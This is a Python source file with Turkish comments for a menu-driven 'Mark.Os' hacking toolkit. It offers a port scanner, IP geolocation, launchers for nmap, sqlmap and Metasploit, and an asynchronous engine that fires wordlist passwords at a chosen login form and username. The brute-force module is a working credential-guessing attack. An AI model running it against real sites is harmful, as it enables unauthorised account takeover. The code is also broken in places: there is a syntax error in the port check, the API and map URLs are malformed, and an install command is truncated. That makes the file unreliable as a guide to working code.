import os
import sys
import time
import socket
import platform
import asyncio
import subprocess

# Gelişmiş Arabirim Renklendirme Kontrolü
try:
    from colorama import Fore, Style, init
    import requests
    import aiohttp
    init(autoreset=True)
except ImportError:
    os.system("pip install colorama requests aiohttp scapy paramiko phonenumbers")
    from colorama import Fore, Style, init
    import requests
    import aiohttp
    init(autoreset=True)

# Global Durum Bayrakları
SIFRE_BULUNDU = False
BULUNAN_SIFRE = None

# =====================================================================
#                 %100 GERÇEK SİBER GÜVENLİK MODÜLLERİ
# =====================================================================

def kurye_port_scanner():
    """Modül 1: TCP Üçlü El Sıkışması Tabanlı Gerçek Zafiyet Tarayıcı"""
    print(f"\n{Fore.YELLOW}[*] Mark.Os TCP Port Zafiyet Analizörü Başlatıldı.")
    ip = input(f"{Fore.GREEN}Hedef IP Adresi (Örn: 127.0.0.1): ").strip()
    # Siber güvenlikte en kritik kapılar
    kritik_portlar = {21: "FTP", 22: "SSH", 23: "Telnet", 80: "HTTP", 443: "HTTPS", 8080: "HTTP-Proxy"}
    
    print(f"{Fore.CYAN}[*] Tarama yapılıyor...")
    for port, servis in kritik_portlar.items():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        if s.connect_ex((ip, port)) == 0:
            print(f"{Fore.GREEN}[+] PORT AÇIK -> {port} ({servis})")
            if port in:
                print(f"    {Fore.RED}[🚨 ZAFİYET] Bu port şifresiz veri iletiyor!")
        s.close()

async def asenkron_web_request(session, url, u_field, p_field, user, password):
    """Mermi hızında HTTP istekleri fırlatan asenkron motor"""
    global SIFRE_BULUNDU, BULUNAN_SIFRE
    if SIFRE_BULUNDU: return
    payload = {u_field: user, p_field: password}
    try:
        async with session.post(url, data=payload, timeout=2) as resp:
            text = await resp.text()
            # Giriş hatası kelimelerini denetleme (Hevristik Analiz)
            if resp.status == 200 and not any(k in text.lower() for k in ["hatali", "wrong", "invalid", "incorrect"]):
                SIFRE_BULUNDU = True
                BULUNAN_SIFRE = password
    except: pass

async def redray_attack_core(url, u_field, p_field, user, wordlist):
    connector = aiohttp.TCPConnector(limit=50)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [asenkron_web_request(session, url, u_field, p_field, user, pwd) for pwd in wordlist]
        await asyncio.gather(*tasks)

def redray_brute_force():
    """Modül 2: Hydra Mantıklı Asenkron Şifre Mukavemet Test Aracı"""
    global SIFRE_BULUNDU, BULUNAN_SIFRE
    print(f"\n{Fore.RED}[🚨] Redray Asenkron Şifre Saldırı Motoru")
    url = input(f"{Fore.GREEN}Hedef Login URL: ").strip()
    u_field = input(f"{Fore.GREEN}Kullanıcı Alan Adı (User Field): ").strip()
    p_field = input(f"{Fore.GREEN}Şifre Alan Adı (Pass Field): ").strip()
    user = input(f"{Fore.GREEN}Saldırılacak Kullanıcı Adı: ").strip()
    w_path = input(f"{Fore.GREEN}Wordlist Yolu: ").strip()
    
    try:
        with open(w_path, "r", encoding="utf-8", errors="ignore") as f:
            wordlist = [line.strip() for line in f if line.strip()]
        SIFRE_BULUNDU = False
        print(f"{Fore.YELLOW}[*] {len(wordlist)} şifre şebekeye asenkron fırlatılıyor...")
        asyncio.run(redray_attack_core(url, u_field, p_field, user, wordlist))
        
        if SIFRE_BULUNDU:
            print(f"\n{Fore.GREEN}[+] ŞİFRE BULUNDU: {BULUNAN_SIFRE}")
        else:
            print(f"\n{Fore.RED}[-] Başarısız: Wordlist bitti.")
    except Exception as e: print(f"{Fore.RED}[-] Hata: {e}")

def kali_arac_entegrasyonu(cmd_name, install_pkg):
    """Modül 3: Kali Linux Yazılımlarını Otomatik Yöneten Sistem Alt Süreci"""
    print(f"\n{Fore.YELLOW}[*] {cmd_name} kontrol ediliyor...")
    check_cmd = "where" if os.name == "nt" else "which"
    res = subprocess.run([check_cmd, cmd_name], capture_output=True, text=True)
    
    if res.stdout.strip():
        print(f"{Fore.GREEN}[+] {cmd_name} hazır! Çalıştırılıyor...")
        time.sleep(1)
        os.system(cmd_name)
    else:
        print(f"{Fore.RED}[-] {cmd_name} sistemde bulunamadı!")
        q = input(f"{Fore.CYAN}[?] Otomatik kurulmasını ister misiniz? (e/h): ").lower().strip()
        if q == "e":
            cmd = f"pkg install {install_pkg} -y" if platform.system() != "Windows" else f"pip install {install_pkg}"
            os.system(cmd)

def ip_geo_locator():
    """Modül 4: Canlı API Tabanlı IP Coğrafi Konum Takip Aracı"""
    print(f"\n{Fore.YELLOW}[*] IP Coğrafi Konum Çözücü")
    ip = input(f"{Fore.GREEN}Sorgulanacak IP: ").strip()
    try:
        r = requests.get(f"http://ip-api.com{ip}", timeout=5)
        data = r.json()
        if data.get("status") == "success":
            print(f"\n{Fore.GREEN}[+] Konum Tespit Edildi:")
            print(f"{Fore.WHITE}  - Ülke: {data.get('country')} | Şehir: {data.get('city')}")
            print(f"{Fore.WHITE}  - ISP : {data.get('isp')}")
            print(f"{Fore.CYAN}  - Harita: https://google.com{data.get('lat')},{data.get('lon')}")
        else: print(f"{Fore.RED}[-] Geçersiz IP veya Yerel Ağ IP'si.")
    except Exception as e: print(f"{Fore.RED}[-] API Hatası: {e}")

# =====================================================================
#                       ARA YÜZ VE SİSTEM MOTORU
# =====================================================================

def os_banner():
    os.system("clear" if os.name != "nt" else "cls")
    print(f"""{Fore.RED}
  ███╗   ███╗ █████╗ ██████╗ ██╗  ██╗   ██████╗ █▄▄▄▄ 
  ████╗ ████║██╔══██╗██╔══██╗██║ ██╔╝  ██╔═══██╗█    ▀▄
  ██╔████╔██║███████║██████╔╝█████╔╝   ██║   ██║███▄▄  
  ██║╚██╔╝██║██╔══██║██╔══██╗██╔═██╗   ██║   ██║█    ▀▄
  ██║ ╚═╝ ██║██║  ██║██║  ██║██║  ██╗  ╚██████╔╝█▄▄▄▄▀ 
  ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═════╝        
    {Fore.CYAN}--- Mark.Os v1.0.0 | Terminal Tabanlı Siber Dağıtım Sistemi ---
    {Fore.WHITE}Ana Sistem Platformu: {platform.system()} {platform.release()}
    {Fore.GREEN}[+] Durum: %100 Gerçek ve Çalışır Siber Güvenlik Modülleri Aktif
    """)

def main():
    while True:
        os_banner()
        print(f"{Fore.BLUE}[ Gelişmiş Ofansif & Defansif Araç Paneli ]")
        print("1 - Mark.Os TCP Port Zafiyet Analizörü")
        print("2 - Redray Asenkron Web Brute-Force Motoru")
        print("3 - IP Coğrafi Konum ve Harita Konumlandırıcı")
        print("4 - Nmap Otomatik Entegrasyon Sistemi")
        print("5 - Sqlmap Otomatik Entegrasyon Sistemi")
        print("6 - Metasploit Framework Entegrasyonu")
        print("0 - Sistemi Kapat")
        print("-" * 65)
        
        choice = input(f"{Fore.CYAN}Mark.Os> ").strip()
        
        if choice == "1": kurye_port_scanner()
        elif choice == "2": redray_brute_force()
        elif choice == "3": ip_geo_locator()
        elif choice == "4": kali_arac_entegrasyonu("nmap", "nmap")
        elif choice == "5": kali_arac_entegrasyonu("sqlmap", "git clone https://github.com")
        elif choice == "6": kali_arac_entegrasyonu("msfconsole", "metasploit")
        elif choice == "0":
            print(f"\n{Fore.GREEN}[+] Mark.Os güvenli bir şekilde kapatıldı. İyi çalışmalar!")
            break
        else:
            print(f"{Fore.RED}[-] Bilinmeyen komut veya geçersiz seçim.")
            time.sleep(1)
        input(f"\n{Fore.CYAN}Devam etmek için Enter'a basın...")

if __name__ == "__main__":
    main()
